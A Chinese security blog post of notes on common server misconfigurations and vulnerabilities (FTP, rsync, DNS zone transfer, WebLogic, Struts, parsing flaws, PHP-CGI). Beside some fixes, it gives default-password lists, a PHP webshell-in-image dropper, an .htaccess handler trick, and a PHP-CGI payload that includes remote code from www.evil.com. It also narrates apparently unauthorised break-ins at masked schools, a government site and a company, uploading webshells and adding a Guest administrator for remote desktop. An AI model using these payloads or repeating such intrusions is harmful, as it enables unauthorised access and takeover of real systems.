
<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  

  <title>Pa55w0rd &#39;s Blog</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="信息安全">
<meta property="og:type" content="website">
<meta property="og:title" content="Pa55w0rd &#39;s Blog">
<meta property="og:url" content="http://www.pa55w0rd.club/page/3/index.html">
<meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
<meta property="og:description" content="信息安全">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Pa55w0rd &#39;s Blog">
<meta name="twitter:description" content="信息安全">

  

  


  


  



  
    <link rel="alternative" href="/atom.xml" title="Pa55w0rd &#39;s Blog" type="application/atom+xml">
  


  
    <link rel="icon" href="/img/favicon.ico">
  


  <link rel="stylesheet" href="/css/style.css">
  <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script><![endif]-->
  <!-- <link href="/vendors/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->

  <link href="/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

  <script src="/js/ua-parser.min.js" type="text/javascript"></script>
  <script src="/js/jquery.js" type="text/javascript"></script>
  <script src="/js/jquery.min.js" type="text/javascript"></script>
  <script src="/js/scrollReveal.js" type="text/javascript"></script>
  <script src="http://cdn.bootcss.com/instantsearch.js/1.5.1/instantsearch.js"></script>
  <script src="/js/algolia-search.js" type="text/javascript"></script>
  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> -->
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
  
  






  
  
  <!-- 
  
  
  
  
   -->

  <script>
   var CONFIG = {
    root: '/',
    algolia: {
          applicationID: "",
          apiKey: "",
          adminApiKey: "",
          indexName: "",
          hits: {"per_page":10},
          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
        }
  };
  </script>

</head>


</html>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div data-scroll-reveal="enter top" id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Pa55w0rd &#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">记录</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
        
          <a class="main-nav-link" href="/archives"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
        
          <a class="main-nav-link" href="/about"><i class="fa fa-about" aria-hidden="true"></i>about</a>
        
          <a class="main-nav-link" href="/categories"><i class="fa fa-categories" aria-hidden="true"></i>Categories</a>
        
          <a class="main-nav-link" href="/tags"><i class="fa fa-tags" aria-hidden="true"></i>标签</a>
        
          <a class="main-nav-link" href="/about"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><i class="fa fa-rss" aria-hidden="true"></i></a>
        
        <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"><i class="fa fa-search" aria-hidden="true"></i></a>
      </nav>
        <div id="local-search-input"></div>
      <!-- 百度搜索 -->
     <!-- <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="www.pa55w0rd.club">
        </form>
      </div>
      -->
   
    </div>
  </div>
</header>

    <div class="outer">
      <section id="main">
  
    <article id="post-安全运维那些洞" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/安全运维那些洞/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-29T03:46:20.000Z" itemprop="datePublished">2018-10-29</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web安全/">web安全</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/安全运维那些洞/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>安全运维那些洞-Aerfa</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <ul>
<li>目录<br>{:toc}</li>
</ul>
<h1 id="0-Readme"><a href="#0-Readme" class="headerlink" title="0 Readme "></a>0 Readme </h1><p>来源于网络，回馈于网络。</p>
<p>以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。</p>
<p>这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。</p>
<p>仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。</p>
<h1 id="1-ftp匿名访问或弱口令"><a href="#1-ftp匿名访问或弱口令" class="headerlink" title="1 ftp匿名访问或弱口令 "></a>1 ftp匿名访问或弱口令 </h1><h2 id="1-1-ftp匿名访问"><a href="#1-1-ftp匿名访问" class="headerlink" title="1.1 ftp匿名访问 "></a>1.1 ftp匿名访问 </h2><p>Username = anonymous &amp;&amp; password = (null )</p>
<p>（1）cmd下，ftp xx.xx.xx.xx</p>
<p>（2）文件夹，<a href="ftp://xx.xx.xx.xx" target="_blank" rel="noopener">ftp://xx.xx.xx.xx</a></p>
<h2 id="1-2-ftp常见弱口令"><a href="#1-2-ftp常见弱口令" class="headerlink" title="1.2 ftp常见弱口令 "></a>1.2 ftp常见弱口令 </h2><p>（1）从wooyun的漏洞案例中看来，常见的弱口令：</p>
<p>网站域名（例如baidu.com） <code>baidu / baidu</code></p>
<p>（2）从xx项目中（漏扫扫出），弱口令为：</p>
<p><code>ftp / ftp</code></p>
<p>（3）网站使用lampp套装，未修改默认ftp密码：</p>
<p><code>nobody / lampp</code></p>
<h2 id="1-3-边学边用"><a href="#1-3-边学边用" class="headerlink" title="1.3 边学边用 "></a>1.3 边学边用 </h2><p>xx.xx.xx.xx 匿名访问 ftp / ftp<br>均可以登录</p>
<p> 使用8uftp登陆：</p>
<p><img src="\assets\img\安全运维\file_html_3d03e9ebaafe6524.png" alt=""></p>
<p>在文件夹中直接输入地址登陆：</p>
<p><img src="\assets\img\安全运维\file_html_fc4bacc7b391f84f.png" alt=""></p>
<p>比较两者之间的差异：前者下载文件会受到大小的限制，后者则不会。</p>
<p>xx.xx.xx.xx yy学校</p>
<p><img src="\assets\img\安全运维\file_html_e8776ff5ccdeee62.png" alt=""></p>
<p>xx.xx.xx.xx zz学校</p>
<p><img src="\assets\img\安全运维\file_html_158b89f932faeb71.png" alt=""></p>
<h1 id="2-rsync匿名访问"><a href="#2-rsync匿名访问" class="headerlink" title="2 rsync匿名访问 "></a>2 rsync匿名访问 </h1><p>参考： drops.wooyun.org/papers/161</p>
<p>rsync是一个远程数据同步工具，用 “rsync<br>算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
<p>下载文件：</p>
<p> ./rsync -vzrtopg –progress<br><a href="mailto:--deleteusername@xxx.xxx.xxx.xxx" target="_blank" rel="noopener">--deleteusername@xxx.xxx.xxx.xxx</a>::out<br>/home/test/getfile</p>
<p>上传文件： </p>
<p>/user/bin/rsync -vzrtopg –progress<br>/home/test/getfile</p>
<h2 id="2-1-利用方法"><a href="#2-1-利用方法" class="headerlink" title="2.1 利用方法"></a>2.1 利用方法</h2><p>rsync<br>默认端口是873，可使用nmap进行扫描：</p>
<p>nmap –n –open –p 873 x.x.x.x/24</p>
<p>尝试上传、下载文件( kali<br>中)：</p>
<p>rsync 10.210.208.39:: </p>
<p>或 rsync –vvvv<br>rsync://10.210.208.39::</p>
<h2 id="2-2-安全配置"><a href="#2-2-安全配置" class="headerlink" title="2.2 安全配置"></a>2.2 安全配置</h2><ul>
<li><p>限定访问IP：IP<br>Tables防火墙或修改配置文件rsync.conf</p>
</li>
<li><p>不允许匿名访问，添加用户口令</p>
</li>
</ul>
<h2 id="2-3-活学活用"><a href="#2-3-活学活用" class="headerlink" title="2.3 活学活用 "></a>2.3 活学活用 </h2><ul>
<li>xx.xx.xx.xx 连接失败</li>
</ul>
<p><img src="\assets\img\安全运维\file_html_86a6c0dd0ec67cd3.png" alt=""></p>
<ul>
<li>通信成功，却不知道该如何操作</li>
</ul>
<p><img src="\assets\img\安全运维\file_html_d6ea7f3e9ce65313.png" alt=""></p>
<ul>
<li>可以查看到目录，但是进一步访问需要密码</li>
</ul>
<p><img src="\assets\img\安全运维\file_html_93d8b6936279365a.png" alt=""></p>
<p>可以查看到目录，但是禁止进一步访问</p>
<p>xx窝</p>
<p><img src="\assets\img\安全运维\file_html_d416cd4216771f91.png" alt=""></p>
<ul>
<li><a href="http://www.xxx.gov.cn" target="_blank" rel="noopener">http://www.xxx.gov.cn</a> xx局</li>
</ul>
<p><code>rsync -v xx.xx.xx.xx::</code></p>
<p><img src="\assets\img\安全运维\file_html_29db8cfd2f6f9255.png" alt=""></p>
<p>上传webshell: # rsync -av /root/Desktop/youxiu.aspx<br>xx.xx.xx.xx::Etest</p>
<p><img src="\assets\img\安全运维\file_html_7ba40be2f34f1334.png" alt=""></p>
<p>确认是否成功：# rsync -v xx.xx.xx.xx::Etest</p>
<p><img src="\assets\img\安全运维\file_html_ac23219ff525104.png" alt=""></p>
<p>获取wenshell: <a href="http://www.xx.cn/youxiu.aspx" target="_blank" rel="noopener">http://www.xx.cn/youxiu.aspx</a> admin</p>
<p><img src="\assets\img\安全运维\file_html_c97ac1aa5603d31e.png" alt=""></p>
<p>xx.xx.xx.xx yy公司OA系统</p>
<p><img src="\assets\img\安全运维\file_html_afd89947e3e3b0f4.png" alt=""></p>
<h1 id="3-DNS域传送漏洞"><a href="#3-DNS域传送漏洞" class="headerlink" title="3 DNS域传送漏洞 "></a>3 DNS域传送漏洞 </h1><p>参考： drops.wooyun.org/papers/64</p>
<p>DNS主备之间数据同步使用的是dns域传送，如果配置不当，就会导致匿名用户获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
<h2 id="3-1-漏洞成因"><a href="#3-1-漏洞成因" class="headerlink" title="3.1 漏洞成因 "></a>3.1 漏洞成因 </h2><p>默认安装BIND<br>，配置项中没有allow-transfer项，就会出现dns域传送<br>漏洞</p>
<p>域传送关键配置项:</p>
<p>allow-transfer{ipaddress;};<br>通过ip限制可进行域传送的服务器</p>
<p>allow-transfer{key transfer;};<br>通过key限制可以进行域传送的服务器</p>
<p>设置方式有两种：</p>
<ul>
<li><p>在option配置域</p>
</li>
<li><p>在zone配置域</p>
</li>
</ul>
<p>优先级为： zone &gt; option</p>
<h2 id="3-2-攻击方式"><a href="#3-2-攻击方式" class="headerlink" title="3.2 攻击方式 "></a>3.2 攻击方式 </h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。导致一些非公开域名（测试域名、内部域名）泄露。而此类域名的安全性相对较低，更容易遭受攻击者的攻击，比如内部测试机往往缺乏必要的安全设置。</p>
<ul>
<li>dos下进行测试</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ljn&gt;nslookup</span><br><span class="line"></span><br><span class="line">&gt; <span class="builtin-name">set</span> <span class="attribute">type</span>=ns</span><br><span class="line"></span><br><span class="line">&gt; 12306.cn</span><br><span class="line"></span><br><span class="line">&gt;<span class="built_in"> server </span>dns1.zdnscloud.biz</span><br><span class="line"></span><br><span class="line">&gt; ls 12306.cn</span><br></pre></td></tr></table></figure>
<ul>
<li>kali中进行测试</li>
</ul>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\# dig @<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> <span class="number">12306.</span>cn axfr</span><br><span class="line">(<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>为dns服务器IP，<span class="number">12306.</span>cn为测试域名)</span><br><span class="line"></span><br><span class="line">或 \# dnsenum <span class="number">12306.</span>cn</span><br></pre></td></tr></table></figure>
<h2 id="3-3-修复方案"><a href="#3-3-修复方案" class="headerlink" title="3.3 修复方案 "></a>3.3 修复方案 </h2><p>只需在限制相应的zone、optio中添加allow-transfer限制可以进行同步的服务器，限制方式有两种:</p>
<ul>
<li>限制IP</li>
<li>使用key认证。</li>
</ul>
<h1 id="4-weblogic弱口令"><a href="#4-weblogic弱口令" class="headerlink" title="4 weblogic弱口令 "></a>4 weblogic弱口令 </h1><p>参考： drops.wooyun.org/tips/402</p>
<h2 id="4-1-基本信息"><a href="#4-1-基本信息" class="headerlink" title="4.1 基本信息 "></a>4.1 基本信息 </h2><p>Weblogic是美国bea公司出品的一个application<br>server（基于javaee架构的中间件），BEA<br>Weblogic用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的java应用服务器。</p>
<p>很多weblogic服务器安装时采用默认密码，攻击者很容易进入weblogic控制台获取相应权限。</p>
<p>默认weblogic管理员账号密码： <code>weblogic /
weblogic</code></p>
<p>默认weblogic开放端口： 7001</p>
<p>默认weblogic访问路径：<br><code>http://xxxx:7001/console</code></p>
<p>从Default Passwords |<br>CIRT.net获取常见weblogic默认密码：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Oracle-WebLogic：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="number">11</span>g：weblogic / welcome1 (实践)</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic：system / password</span><br><span class="line"></span><br><span class="line">Oracle-Weblogic(Version: <span class="number">9.0</span> Beta(Diablo))：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：admin / security</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：mary / password</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：joe / password</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：wlcsystem / wlcsystem</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：wlpisystem / wlpisystem</span><br></pre></td></tr></table></figure></p>
<p>查看wooyun漏洞案例，积累常见弱口令：<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">weblogic / weblogic123</span><br><span class="line"></span><br><span class="line">weblogic / <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line">admin / <span class="number">12345678</span></span><br></pre></td></tr></table></figure></p>
<h2 id="4-2-利用方式"><a href="#4-2-利用方式" class="headerlink" title="4.2 利用方式 "></a>4.2 利用方式 </h2><p>寻找weblogic服务器方法：</p>
<ul>
<li><p>使用 IIS PUT Scaner<br>扫描80、8080端口，查看HTTP<br>banner信息，确定为weblogic；</p>
</li>
<li><p>直接扫描7001端口或者baidu<br>inurl: :7001/console (待尝试)</p>
</li>
</ul>
<p>利用弱口令进入管理后台，在控制台部署一个web应用：</p>
<p>Deploy =&gt; web application modules =&gt; Deploy a new Web Application<br>Module… =&gt;upload your file(s) =&gt; Deploy</p>
<p>在Web应用中包含模块：必须要有一个servlet或JSP<br>web.xml文件，包含web应用程序的信息</p>
<h2 id="4-3-安全配置"><a href="#4-3-安全配置" class="headerlink" title="4.3 安全配置 "></a>4.3 安全配置 </h2><p><a href="http://download.oracle.com/docs/cd/E12890\_01/ales/docs32/integrateappenviron/configWLS.html\#wp1099454" target="_blank" rel="noopener">http://download.oracle.com/docs/cd/E12890\_01/ales/docs32/integrateappenviron/configWLS.html\#wp1099454</a></p>
<h2 id="4-4-现学现卖"><a href="#4-4-现学现卖" class="headerlink" title="4.4 现学现卖 "></a>4.4 现学现卖 </h2><p><a href="http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp</a></p>
<p><img src="\assets\img\安全运维\file_html_a09bb089c1c3b312.png" alt=""></p>
<p>weblogic / 12345678</p>
<p><img src="\assets\img\安全运维\file_html_6d6c9016367bb35b.png" alt=""></p>
<p>部署war包（war包其实是index.jsp + META-INF + WEB-INF的压缩包）：</p>
<p>先制作war包（需安装java环境）：</p>
<p>c:\app&gt;cd c:/program files/java/dk1.8.0_31/bin</p>
<p>c:\Program Files\Java\jdk1.8.0_31\bin&gt;jar -cvf app.war c:/app</p>
<p><img src="\assets\img\安全运维\file_html_3493c9640cf370ac.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_ba1e3acff7df0d95.png" alt=""></p>
<p>部署——&gt;安装——&gt;上载文件——&gt;一直点确定即可，得到shell</p>
<p>（自己制作war包失败，重新下载了一个war包，上传）</p>
<p><a href="http://xx.xx.xx.xx:7001/index/a.jsp" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/index/a.jsp</a> (安全起见，已删除)</p>
<p><a href="http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\\phpstudy\\WWW" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\\phpstudy\\WWW</a></p>
<p><img src="\assets\img\安全运维\file_html_cf68ba09dbca62df.png" alt=""></p>
<p>翻目录：</p>
<p><img src="\assets\img\安全运维\file_html_63592e979d64fae2.png" alt=""></p>
<p><a href="http://xx.xx.xx.xx/weimall" target="_blank" rel="noopener">http://xx.xx.xx.xx/weimall</a> mall.xx.cn v.xx.cn</p>
<p><img src="\assets\img\安全运维\file_html_b9a7ba7d2ab3078c.png" alt=""></p>
<p><a href="http://xx.xx.xx.xx/fenxiao/" target="_blank" rel="noopener">http://xx.xx.xx.xx/fenxiao/</a> 米某网 </p>
<p><a href="http://xx.x.xx.xx/fenxiao/api/client/uc.php" target="_blank" rel="noopener">http://xx.x.xx.xx/fenxiao/api/client/uc.php</a> youxiu<br>（已修改时间，该shell好用）</p>
<p><code>net user</code></p>
<p><img src="\assets\img\安全运维\file_html_d3ed608fe971124a.png" alt=""></p>
<p><code>net user Guest xiuyou!</code></p>
<p><img src="\assets\img\安全运维\file_html_6ea978c38fc505e6.png" alt=""></p>
<p><code>net localgroup administrators</code></p>
<p><img src="\assets\img\安全运维\file_html_eae0acb1c41ca212.png" alt=""></p>
<p><code>net localgroup administrators Guest /add</code></p>
<p><img src="\assets\img\安全运维\file_html_60b78b69da695ec6.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_30d1210394b8be38.png" alt=""></p>
<p>mstsc打开远程终端，<code>Guest / xiuyou!</code></p>
<p><img src="\assets\img\安全运维\file_html_f8671774fb643b0f.png" alt=""></p>
<p>激活Guest用户 <code>net user Guest /active:yes</code></p>
<p><img src="\assets\img\安全运维\file_html_880a526fcaa8650a.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_25d3715c70e27e3d.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_790c103cd138a9e2.png" alt=""></p>
<h1 id="5-struts漏洞"><a href="#5-struts漏洞" class="headerlink" title="5 struts漏洞 "></a>5 struts漏洞 </h1><p>drops.wooyun.org/papers/902</p>
<p>sebug.net/appdir/Apache+Struts</p>
<p>Struts是Apache软件基金会Jakarta项目组的一个开源项目，它采用MVC模式，帮助java开发者利用J2EE开发Web应用，可以用来构件复杂的Web应用。它允许我们分解一个应用程序的商业逻辑、控制逻辑和表现逻辑的代码，使它的重用性和维护性更好。</p>
<h2 id="5-1-S2-016命令执行漏洞"><a href="#5-1-S2-016命令执行漏洞" class="headerlink" title="5.1 S2-016命令执行漏洞 "></a>5.1 S2-016命令执行漏洞 </h2><p>在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts<br>2.3.15.1以下版本均存在此漏洞。</p>
<h2 id="5-2-S2-017重定向漏洞"><a href="#5-2-S2-017重定向漏洞" class="headerlink" title="5.2 S2-017重定向漏洞 "></a>5.2 S2-017重定向漏洞 </h2><p>Apache Struts<br>2.0.0没有有效过滤”redirect:”/“redirectAction:”参数前缀内容，存在多个开放重定向漏洞，攻击者通过构建特制的URI并诱使用户点击，利用这些漏洞将这些用户重定向到攻击者控制的站点，执行钓鱼攻击。</p>
<h2 id="5-3-S2-019命令执行漏洞"><a href="#5-3-S2-019命令执行漏洞" class="headerlink" title="5.3 S2-019命令执行漏洞"></a>5.3 S2-019命令执行漏洞</h2><p>Struts2 是第二代基于Model-View-Controller<br>(MVC)模型的java企业级web应用框架。Apache<br>Struts 2.3.15.2之前版本的“Dynamic Method<br>Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
<h1 id="6-web服务器解析漏洞"><a href="#6-web服务器解析漏洞" class="headerlink" title="6 web服务器解析漏洞 "></a>6 web服务器解析漏洞 </h1><p><a href="http://www.cnseay.com/806/" target="_blank" rel="noopener">www.cnseay.com/806/</a></p>
<h2 id="6-1-IIS-6-0"><a href="#6-1-IIS-6-0" class="headerlink" title="6.1 IIS 6.0 "></a>6.1 IIS 6.0 </h2><ul>
<li><p>后缀解析： /xx.asp;.jpg</p>
</li>
<li><p>目录解析： /xx.asp/xx.jpg<br>（xx.asp目录下可解析任何文件）</p>
</li>
<li><p>默认解析： xx.asa xx.cer xx.cdx<br>（IIS默认配置中，该类文件由asp.dll解析）</p>
</li>
<li><p>发散思维： /xx.asa/xx.jpg /xx.cer/xx.jpg /xx.cdx/xx.jpg</p>
</li>
</ul>
<h2 id="6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37"><a href="#6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37" class="headerlink" title="6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 "></a>6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 </h2><p>默认Fast-CGI开启状况下，在文件路径（/xx.jpg）后加上/xx.php，即/xx.jpg/xx.php会被解析为php文件。</p>
<p>xx.jpg为一句话图片马，制作过程如下：</p>
<p><code>copy yy.jpg/b + zz.txt/a xx.jpg</code></p>
<p>/b：二进制模式</p>
<p>/a：ASCII模式</p>
<p>yy.jpg ：正常图片文件</p>
<p>zz.txt ：一句话 &lt;?PHP<br>fputs(fopen(‘shell.php’,’w’),’&lt;?PHP<br>eval(\$_POST\youxiu)?&gt;’);?&gt;</p>
<p>shell.php youxiu</p>
<h2 id="6-3-Nginx-lt-0-8-37"><a href="#6-3-Nginx-lt-0-8-37" class="headerlink" title="6.3 Nginx&lt;=0.8.37 "></a>6.3 Nginx&lt;=0.8.37 </h2><p>在Fast-CGI关闭的情况下，Nginx仍然存在解析漏洞：</p>
<p>在文件路劲(xx.jpg)后面加上%00.php ，即<br>xx.jpg%00.php<br>会被当做php文件来解析</p>
<p>参照《Nginx空字节可远程执行代码漏洞》</p>
<h2 id="6-4-Apache"><a href="#6-4-Apache" class="headerlink" title="6.4 Apache "></a>6.4 Apache </h2><ul>
<li>后缀解析： test.php.x1.x2.x3<br>（x1,x2,x3为没有在mime.types文件中定义的文件类型）</li>
</ul>
<p>Apache将从右往左开始判断后缀，若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析。</p>
<p>Apache可解析： php | php3 | phtml</p>
<p>参照《Apache漏洞之后缀名解析漏洞》</p>
<p>防范：在apache配置文件中添加禁止.php文件执行的语句：</p>
<p>&lt;Files ~ ”.(php.|php3.|phtml.)”&gt;</p>
<p>Order Allow,Deny</p>
<p>Deny from all</p>
<p>&lt;/Files&gt;</p>
<ul>
<li>若在Apache中，<br>.htaccess可被应用（即<br>AllowOverride=All）</li>
</ul>
<p>.htaccess可被上传</p>
<p>则在.htaccess中写入<br>(shell.jpg为上传文件，便可得到shell)</p>
<p>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;</p>
<h2 id="6-5-lighttpd"><a href="#6-5-lighttpd" class="headerlink" title="6.5 lighttpd "></a>6.5 lighttpd </h2><p>xx.jpg/xx.php</p>
<h2 id="6-6-windows环境"><a href="#6-6-windows环境" class="headerlink" title="6.6 windows环境 "></a>6.6 windows环境 </h2><p>Windows环境下，文件 xx.jpg[空格]</p>
<p>文件 xx.jpg.</p>
<p>两类文件不允许存在。若这样命名，windows会自动除去空格和点，从而被利用。</p>
<h1 id="7-PHP-CGI远程任意代码执行漏洞"><a href="#7-PHP-CGI远程任意代码执行漏洞" class="headerlink" title="7 PHP-CGI远程任意代码执行漏洞 "></a>7 PHP-CGI远程任意代码执行漏洞 </h1><p>zone.wooyun.org/content/151</p>
<p><a href="http://www.hackbase.com/tech/2012-05-07/66395.html" target="_blank" rel="noopener">www.hackbase.com/tech/2012-05-07/66395.html</a></p>
<p>该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行，目前截获到的攻击主要利用以下PHP参数：</p>
<p><img src="\assets\img\安全运维\file_html_7505e63d7f39ad25.png" alt=""></p>
<h2 id="7-1-本地包含执行代码"><a href="#7-1-本地包含执行代码" class="headerlink" title="7.1 本地包含执行代码 "></a>7.1 本地包含执行代码 </h2><p>curl -H “USER-AGENT: &lt;?system(‘id’);die();?&gt;”</p>
<p><a href="http://target.com/test.php?-dauto\_prepend\_file%3d/proc/self/environ+-n" target="_blank" rel="noopener">http://target.com/test.php?-dauto\_prepend\_file%3d/proc/self/environ+-n</a> </p>
<p>（/proc/self/environ 为本地文件路径）</p>
<h2 id="7-2-远程包含执行代码"><a href="#7-2-远程包含执行代码" class="headerlink" title="7.2 远程包含执行代码 "></a>7.2 远程包含执行代码 </h2><p>Curl<br><a href="http://target.com/test.php?-dallow\_url\_include%3dOn+-dauto\_prepend\_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt" target="_blank" rel="noopener">http://target.com/test.php?-dallow\_url\_include%3dOn+-dauto\_prepend\_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a> </p>
<p>（%3d = %3a : %2f / ）</p>
<p>（<a href="http://www.evail.com/evil.txt为木马文件）" target="_blank" rel="noopener">http://www.evail.com/evil.txt为木马文件）</a></p>
<h1 id="8-FCK编辑器上传漏洞"><a href="#8-FCK编辑器上传漏洞" class="headerlink" title="8 FCK编辑器上传漏洞 "></a>8 FCK编辑器上传漏洞 </h1><h2 id="8-1-漏洞利用"><a href="#8-1-漏洞利用" class="headerlink" title="8.1 漏洞利用 "></a>8.1 漏洞利用 </h2><ul>
<li><p>编辑器本身存在漏洞：更多参见《后台编辑器漏洞手册》</p>
</li>
<li><p>编辑器 + web服务器解析漏洞</p>
</li>
<li><p>突破后台建立文件夹漏洞（. 变<br>_）</p>
</li>
</ul>
<h1 id="9-Apache-Server-Status对外暴露"><a href="#9-Apache-Server-Status对外暴露" class="headerlink" title="9 Apache Server Status对外暴露 "></a>9 Apache Server Status对外暴露 </h1><p><a href="http://www.ccvita.com/333.html" target="_blank" rel="noopener">www.ccvita.com/333.html</a></p>
<p>Apache 1.3.2及之后的版本自带查看Apache状态的功能模块<br>server-status，若设置不严（对公网开放），就会造成信息泄露，例如：真实IP、性能信息、客户端IP、旁站信息等。</p>
